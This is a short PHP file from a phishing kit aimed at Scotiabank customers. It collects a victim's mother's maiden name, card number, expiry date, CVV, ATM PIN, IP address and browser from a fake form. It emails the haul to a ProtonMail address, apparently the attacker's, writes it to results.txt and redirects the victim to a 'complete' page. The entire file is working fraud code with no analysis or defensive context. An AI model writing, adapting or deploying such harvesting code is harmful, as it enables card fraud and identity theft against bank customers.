<?php
include("blocker.php");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 PersonalDetails----------------\n";
$message .= "MMN		: ".$_POST['MN']."\n";
$message .= "-----------------3 CardDetails--------------------\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-------------------------------------------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------SCOTIARESULTS--------------------\n";
$send = "rikkogreen44@protonmail.com";
$subject = "scotiaResultz 2 ".$ip;

@mail($send,$subject,$message);

$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "complete.php";
</script>